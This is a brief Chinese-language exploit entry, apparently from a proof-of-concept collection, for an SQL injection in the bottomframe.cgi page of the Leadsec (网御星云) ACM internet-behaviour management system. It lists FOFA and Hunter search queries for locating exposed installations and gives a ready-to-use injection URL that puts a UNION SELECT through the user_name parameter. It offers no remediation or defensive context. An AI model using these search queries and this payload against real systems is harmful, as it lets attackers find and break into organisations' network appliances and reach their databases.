# 网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞

## 网络测绘

fofa: title="Leadsec ACM" && "scripts/webcommon.js"

hunter: app.name="LeadSec 网御星云 ACM"

## POC / EXP

```
/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23
```